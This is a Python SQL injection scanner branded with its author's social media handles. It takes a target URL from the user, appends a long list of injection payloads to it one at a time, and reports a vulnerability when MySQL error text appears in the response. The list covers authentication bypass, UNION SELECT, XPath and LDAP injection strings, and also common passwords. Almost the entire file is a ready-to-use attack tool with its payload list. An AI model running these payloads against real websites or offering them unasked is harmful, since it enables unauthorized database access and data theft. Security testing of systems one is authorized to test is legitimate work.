import requests

def display_banner():
    banner = """
    ██╗  ██╗ ██████╗ ██╗  ██╗ ██████╗ ██╗  ██╗     ███████╗███████╗ ██████╗
    ██║ ██╔╝██╔═══██╗██║ ██╔╝██╔═══██╗██║ ██╔╝     ██╔════╝██╔════╝██╔════╝
    █████╔╝ ██║   ██║█████╔╝ ██║   ██║█████╔╝█████╗███████╗█████╗  ██║     
    ██╔═██╗ ██║   ██║██╔═██╗ ██║   ██║██╔═██╗╚════╝╚════██║██╔══╝  ██║     
    ██║  ██╗╚██████╔╝██║  ██╗╚██████╔╝██║  ██╗     ███████║███████╗╚██████╗
    ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝     ╚══════╝╚══════╝ ╚═════╝                                                                                           
     ====================================================================
     **                  Instagram : @risky.manuel                     **
     **                  Telegram  : @kikikokok9                       **
     **                  Email     : riskymanuel08@proton.me           **
     ====================================================================
    """
    print(banner)

def test_sql_injection(url):
    sql_payloads = [
        "' OR '1'='1",
        "' OR '1'='1' -- ",
        "' OR 1=1 -- ",
        '" OR "1"="1',
        '" OR "1"="1" -- ',
        "' or 1=1",
        "' or 1=1 limit 1 -- -+",
        # Common usernames and passwords
        "admin",
        "password",
        "1234",
        "123456",
        "root",
        "toor",
        "test",
        "guest",
        # Additional SQL injection payloads
        "' or '1'='1",
        "' or ''='",
        "' or 1]%00",
        "' or /* or '",
        "' or \"a\" or '",
        "' or 1 or '",
        "' or true() or '",
        "'or string-length(name(.))<10 or'",
        "'or contains(name,'adm') or'",
        "'or contains(.,'adm') or'",
        "'or position()=2 or'",
        "admin' or '",
        "admin' or '1'='2",
        "*",
        "*)(&",
        "*)(|(&",
        "pwd)",
        "*)(|(*",
        "*))%00",
        "admin)(&)",
        "pwd",
        "admin)(!(&(|",
        "pwd))",
        "admin))(|(|",
        "'-",
        "' '",
        "'&'",
        "'^'",
        "'*'",
        "' or ''-'",
        "' or '' '",
        "' or ''&'",
        "' or ''^'",
        "' or ''*'",
        "\"-\"",
        "\" \"",
        "\"&\"",
        "\"^\"",
        "\"*\"",
        "\" or \"\"-\"",
        "\" or \"\" \"",
        "\" or \"\"&\"",
        "\" or \"\"^\"",
        "\" or \"\"*\"",
        "or true--",
        "\" or true--",
        "' or true--",
        "\") or true--",
        "') or true--",
        "' or 'x'='x",
        "') or ('x')=('x",
        "')) or (('x'))=(('x",
        "\" or \"x\"=\"x",
        "\") or (\"x\")=(\"x",
        "\")) or ((\"x\"))=((\"x",
        "or 1=1",
        "or 1=1--",
        "or 1=1#",
        "or 1=1/*",
        "admin' --",
        "admin' #",
        "admin'/*",
        "admin' or '1'='1",
        "admin' or '1'='1'--",
        "admin' or '1'='1'#",
        "admin' or '1'='1'/*",
        "admin'or 1=1 or ''='",
        "admin' or 1=1",
        "admin' or 1=1--",
        "admin' or 1=1#",
        "admin' or 1=1/*",
        "admin') or ('1'='1",
        "admin') or ('1'='1'--",
        "admin') or ('1'='1'#",
        "admin') or ('1'='1'/*",
        "admin') or '1'='1",
        "admin') or '1'='1'--",
        "admin') or '1'='1'#",
        "admin') or '1'='1'/*",
        "1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055",
        "1234 ' AND 1=0 UNION ALL SELECT 'admin', '7110eda4d09e062aa5e4a390b0a572ac0d2c0220",
        "admin\" --",
        "admin\" #",
        "admin\"/*",
        "admin\" or \"1\"=\"1",
        "admin\" or \"1\"=\"1\"--",
        "admin\" or \"1\"=\"1\"#",
        "admin\" or \"1\"=\"1\"/*",
        "admin\"or 1=1 or \"\"=\"",
        "admin\" or 1=1",
        "admin\" or 1=1--",
        "admin\" or 1=1#",
        "admin\" or 1=1/*",
        "admin\") or (\"1\"=\"1",
        "admin\") or (\"1\"=\"1\"--",
        "admin\") or (\"1\"=\"1\"#",
        "admin\") or (\"1\"=\"1\"/*",
        "1234 \" AND 1=0 UNION ALL SELECT \"admin\", \"81dc9bdb52d04dc20036dbd8313ed055",
        "1234 \" AND 1=0 UNION ALL SELECT \"admin\", \"7110eda4d09e062aa5e4a390b0a572ac0d2c0220",
        "==",
        "=",
        "'",
        "' --",
        "' #",
        "' –",
        "'--",
        "'/*",
        "'#",
        "\" --",
        "\" #",
        "\"/*",
        "' and 1='1",
        "' and a='a",
        "or true",
        "' or ''='",
        "\" or \"\"=\"",
        "1′) and '1′='1–",
        "' AND 1=0 UNION ALL SELECT '', '81dc9bdb52d04dc20036dbd8313ed055",
        "\" AND 1=0 UNION ALL SELECT \"\", \"81dc9bdb52d04dc20036dbd8313ed055",
        "' AND 1=0 UNION ALL SELECT '', '7110eda4d09e062aa5e4a390b0a572ac0d2c0220",
        "\" AND 1=0 UNION ALL SELECT \"\", \"7110eda4d09e062aa5e4a390b0a572ac0d2c0220",
        "and 1=1",
        "and 1=1–",
        "' and 'one'='one",
        "' and 'one'='one–",
        "' group by password having 1=1--",
        "' group by userid having 1=1--",
        "' group by username having 1=1--",
        "like '%'",
        "or 0=0 --",
        "or 0=0 #",
        "or 0=0 –",
        "' or         0=0 #",
        "' or 0=0 --",
        "' or 0=0 #",
        "' or 0=0 –",
        "\" or 0=0 --",
        "\" or 0=0 #",
        "\" or 0=0 –",
        "%' or '0'='0",
        "or 1=1–",
        "' or 1=1--",
        "' or '1'='1",
        "' or '1'='1'--",
        "' or '1'='1'/*",
        "' or '1'='1'#",
        "' or '1′='1",
        "' or 1=1",
        "' or 1=1 --",
        "' or 1=1 –",
        "' or 1=1;#",
        "' or 1=1/*",
        "' or 1=1#",
        "' or 1=1–",
        "') or '1'='1",
        "') or '1'='1--",
        "') or '1'='1'--",
        "') or '1'='1'/*",
        "') or '1'='1'#",
        "') or ('1'='1",
        "') or ('1'='1--",
        "') or ('1'='1'--",
        "') or ('1'='1'/*",
        "') or ('1'='1'#",
        "'or'1=1",
        "'or'1=1′",
        "\" or \"1\"=\"1",
        "\" or \"1\"=\"1\"--",
        "\" or \"1\"=\"1\"/*",
        "\" or \"1\"=\"1\"#",
        "\" or 1=1",
        "\" or 1=1 --",
        "\" or 1=1 –",
        "\" or 1=1--",
        "\" or 1=1/*",
        "\" or 1=1#",
        "\" or 1=1–",
        "\") or \"1\"=\"1",
        "\") or \"1\"=\"1\"--",
        "\") or \"1\"=\"1\"/*",
        "\") or \"1\"=\"1\"#",
        "\") or (\"1\"=\"1",
        "\") or (\"1\"=\"1\"--",
        "\") or (\"1\"=\"1\"/*",
        "\") or (\"1\"=\"1\"#",
        ") or '1′='1–",
        ") or ('1′='1–",
        "' or 1=1 LIMIT 1;#",
    ]

    for payload in sql_payloads:
        target_url = url + payload
        print(f"Testing: {target_url}")
        
        try:
            response = requests.get(target_url)
            if "SQL syntax" in response.text or "mysql_fetch" in response.text or "MySQL" in response.text:
                print(f"Possible SQL Injection vulnerability found with payload: {payload}")
                return True
        except requests.RequestException as e:
            print(f"An error occurred: {e}")
            return False

    print("No SQL Injection vulnerability found.")
    return False

def main():
    display_banner()
    
    target = input("Enter the target URL (e.g., http://example.com/index.php?id=1): ").strip()
    if not target:
        print("Please provide a valid URL.")
        return
    
    if not target.startswith("http://") and not target.startswith("https://"):
        target = "http://" + target

    if test_sql_injection(target):
        print("Vulnerability detected!")
    else:
        print("No vulnerabilities detected.")

if __name__ == "__main__":
    main()
